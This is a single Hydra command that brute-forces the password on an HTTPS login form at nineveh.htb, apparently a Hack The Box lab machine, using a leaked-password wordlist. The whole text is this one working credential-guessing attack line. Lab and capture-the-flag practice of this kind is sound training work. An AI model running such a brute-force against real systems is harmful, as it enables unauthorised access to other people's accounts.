hydra -l '' -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&login=Log In&proc_login=true:Incorrect password."
